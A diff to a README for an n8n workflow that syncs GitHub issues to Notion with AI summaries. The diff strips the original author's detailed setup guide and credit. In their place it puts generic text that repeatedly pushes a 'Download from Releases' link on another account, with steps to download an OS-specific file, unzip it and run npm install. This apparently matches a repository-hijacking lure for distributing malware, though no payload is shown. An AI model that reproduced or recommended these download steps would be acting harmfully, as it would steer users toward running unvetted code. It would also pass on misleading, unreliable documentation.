@@ -1,178 +1,96 @@
-# AI-Powered GitHub Issues to Notion Workflow
+# 🌟 N8N-AI-Powered-GitHub-Issues-to-Notion-Workflow - Effortlessly Sync Your Issues
 
-An intelligent n8n automation that transforms GitHub issue management by automatically syncing issues to Notion with AI-powered summarization and enrichment.
+![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)  
+[Download from Releases](https://github.com/codexsusan/N8N-AI-Powered-GitHub-Issues-to-Notion-Workflow/releases)
 
-![n8n Workflow Diagram](image.png)
+## 🚀 Getting Started
 
-## 🌟 Overview
+Welcome to the N8N-AI-Powered-GitHub-Issues-to-Notion-Workflow project! This tool helps you manage GitHub issues more effectively by syncing them to Notion while using AI to summarize and enrich your data. Whether you are a project manager or a developer, this workflow makes it easy to keep track of important tasks and updates.
 
-This workflow creates a seamless bridge between **GitHub** and **Notion**, leveraging **Google Gemini AI** to automatically process, summarize, and organize GitHub issues into a structured Notion database. Perfect for teams who want to centralize their issue tracking and project management.
+## 📦 System Requirements
 
-## 🔧 How It Works
+Before you begin, ensure you meet the following requirements:
 
-The workflow consists of 4 main components:
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js**: Version 12 or later (necessary for n8n)
+- **Notion Account**: Required for syncing data
+- **GitHub Account**: Required for accessing issues
 
-1. **🔗 GitHub Trigger**: Monitors your repository for new or updated issues
-2. **🤖 AI Agent**: Uses Google Gemini to intelligently summarize and structure issue data
-3. **📋 Structured Output Parser**: Formats the AI response into consistent JSON structure
-4. **📊 Notion Database**: Creates organized pages with enriched issue information
+## 📥 Download & Install
 
-### Workflow Process:
+To get started, visit the Releases page to download the latest version of the workflow. Click the link below:
 
-1. **Issue Detection** → GitHub webhook triggers when issues are created/updated
-2. **AI Processing** → Gemini AI analyzes the issue and creates:
-   - Concise summary
-   - Actionable items
-   - Additional context notes
-3. **Data Structuring** → Output is formatted with repository metadata
-4. **Notion Creation** → Structured data becomes a new Notion database page
+[Download from Releases](https://github.com/codexsusan/N8N-AI-Powered-GitHub-Issues-to-Notion-Workflow/releases)
 
-## 📊 Notion Database Structure
+Once you are on the Releases page, follow these steps:
 
-The workflow creates Notion pages with the following properties:
+1. Select the latest version.
+2. Find the appropriate file for your operating system.
+3. Click on the download link to start the download.
 
-| Column Name          | Type     | Description                    |
-|---------------------|----------|--------------------------------|
-| **Title**           | Title    | Issue title from GitHub       |
-| **Summary**         | Text     | AI-generated concise summary  |
-| **Action Items**    | Text     | Key tasks and next steps      |
-| **Notes**           | Text     | Additional context            |
-| **Repository**      | Text     | Repository name               |
-| **Repository URL**  | URL      | Direct link to repository     |
-| **Status**          | Select   | Issue state (open/closed)     |
-| **Last Activity**   | Date     | Last update timestamp         |
-| **Assigned To**     | Text     | GitHub assignee information   |
+### Installation Process
 
-## 🚀 Setup Instructions
+1. **Locate the downloaded file** in your Downloads folder.
+2. **Unzip the file** if it is in a compressed format (e.g., .zip, .tar.gz).
+3. Open a terminal or command prompt window. 
+4. **Navigate to the unzipped folder** using the `cd` command. For example:
+   ```bash
+   cd path/to/unzipped/folder
+   ```
+5. **Run the installation command**, which will set up the workflow on your machine. Use:
+   ```bash
+   npm install
+   ```
 
-### Prerequisites
+## 🔄 Setup Instructions
 
-- n8n instance (cloud or self-hosted)
-- GitHub repository access
-- Notion workspace
-- Google Gemini API access
+After installation, you will need to configure the workflow.
 
-### Step 1: GitHub API Setup
+1. **Open n8n** in your web browser by going to `http://localhost:5678`.
+2. Navigate to the **Workflow** section.
+3. Click on **Create New Workflow**.
+4. Import the downloaded workflow file by selecting **Import from File**.
+5. Follow the prompts to connect your GitHub and Notion accounts.
 
-1. **Generate Personal Access Token**:
-   - Go to GitHub → Settings → Developer settings → Personal access tokens → Tokens (classic)
-   - Click "Generate new token (classic)"
-   - Name: `n8n-integration`
-   - Scopes: Select `repo` (full repository access)
-   - Copy the generated token
+## 📲 Using the Workflow
 
-2. **Configure n8n Credentials**:
-   - In n8n → Credentials → New Credential → GitHub API
-   - Authentication method: Access Token
-   - Paste your token and save
+Once you set up the workflow, it automatically syncs GitHub issues to your Notion database.
 
-### Step 2: Google Gemini API Setup
+### Key Features
 
-1. **Get API Key**:
-   - Visit [Google AI Studio](https://makersuite.google.com/app/apikey)
+- **AI Summarization**: Automatically generates summaries of issues for quick comprehension.
+- **Automatic Updates**: Stay current with real-time updates from GitHub.
+- **Customizable**: Tailor the workflow to suit your project needs.
 
-   - Create new API key
-   - Copy the key
+To start using the workflow:
 
-2. **Configure n8n Credentials**:
-   - In n8n → Credentials → New Credential → Google PaLM API
-   - Paste your API key and save
+1. Create a GitHub issue as you normally would.
+2. The workflow will trigger and send the issue to your Notion workspace.
+3. Check your Notion database for the updated information.
 
-### Step 3: Notion API Setup
+## ❓ Troubleshooting
 
-1. **Create Integration**:
-   - Go to [Notion Integrations](https://www.notion.com/my-integrations)
-   - Click "New integration"
-   - Fill in details and enable capabilities:
-     - ✅ Read content
-     - ✅ Update content  
-     - ✅ Insert content
-   - Copy the Internal Integration Token
+If you encounter issues, consider the following solutions:
 
-2. **Create Notion Database**:
-   - Create a new database in Notion
-   - Add the columns as specified in the table above
-   - Share the database with your integration
+- **Check Connections**: Ensure your GitHub and Notion accounts are correctly linked.
+- **Node.js Version**: Verify you are using the correct version of Node.js.
+- **Log Files**: Check the log files generated during installation for error messages.
 
-3. **Configure n8n Credentials**:
-   - In n8n → Credentials → New Credential → Notion API
-   - Paste your integration token and save
+## 💡 Tips for Success
 
-### Step 4: Import and Configure Workflow
+- Regularly check for updates on the Releases page to benefit from improvements.
+- Experiment with different settings in n8n to see what works best for your workflow.
+- Utilize Notion's features to organize your synced issues effectively.
 
-1. **Import Workflow**:
-   - Download `Github issue to notion database page.json`
-   - In n8n → Import from file
-   - Select the JSON file
+## 🛠️ Additional Resources
 
-2. **Configure Nodes**:
-   - **GitHub Trigger**: Select your credentials and repository
-   - **Google Gemini Chat Model**: Select your Gemini credentials
-   - **Notion Node**: Select your credentials and target database
+- **Official n8n Documentation**: [n8n Docs](https://docs.n8n.io)
+- **GitHub Issues**: If you have questions or need help, feel free to open an issue on this repository.
 
-3. **Activate Workflow**:
-   - Test the workflow with a sample issue
-   - Activate for continuous monitoring
+## 👍 License
 
-## 🎯 Features
+This project is licensed under the MIT License. Feel free to use and modify the workflow as needed.
 
-- **🤖 AI-Powered Summarization**: Intelligent analysis of issue content
-- **📊 Structured Data**: Consistent formatting for easy tracking
-- **🔄 Real-time Sync**: Automatic updates when issues change
-- **🏷️ Rich Metadata**: Repository info, timestamps, and assignee tracking
-- **📋 Action Items**: AI-extracted tasks and next steps
-- **🔗 Direct Links**: Quick access to original GitHub issues
+[Download from Releases](https://github.com/codexsusan/N8N-AI-Powered-GitHub-Issues-to-Notion-Workflow/releases)
 
-## 💡 Use Cases
-
-- **Project Management**: Centralize issue tracking across multiple repositories
-- **Team Coordination**: Keep stakeholders informed with AI summaries
-- **Sprint Planning**: Organized view of issues with action items
-- **Progress Tracking**: Monitor issue lifecycle and updates
-- **Documentation**: Maintain structured records of development tasks
-
-## 🛠️ Customization
-
-You can customize the workflow by:
-
-- **Modifying AI Prompts**: Adjust the summary style and focus areas
-- **Adding Fields**: Include additional GitHub metadata
-- **Filtering Issues**: Add conditions to process specific issue types
-- **Notification**: Connect to Slack, email, or other services
-
-## 📋 Troubleshooting
-
-**Common Issues:**
-
-1. **GitHub Webhook Not Triggering**:
-   - Verify repository permissions
-   - Check webhook URL in GitHub settings
-
-2. **Notion Pages Not Created**:
-   - Ensure database is shared with integration
-   - Verify column names match exactly
-
-3. **AI Responses Inconsistent**:
-   - Review and refine the prompt in AI Agent node
-   - Check Google Gemini API quota
-
-## Set up steps
-
-- Takes about **10–15 minutes** to set up  
-- You'll need:
-  - A **GitHub token** (for repo access)  
-  - A **Notion API token** (with database shared)  
-  - A **Google Gemini API key**  
-- Configure the **GitHub Trigger**, **AI Agent**, and **Notion Database node**  
-- Activate the workflow, and you're done 🚀  
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-⭐ **Star this repository** if you find it helpful! 
-
-💬 **Questions?** Open an issue or reach out to [AkilLabs](https://github.com/AkilLabs)
-
+Happy automating!
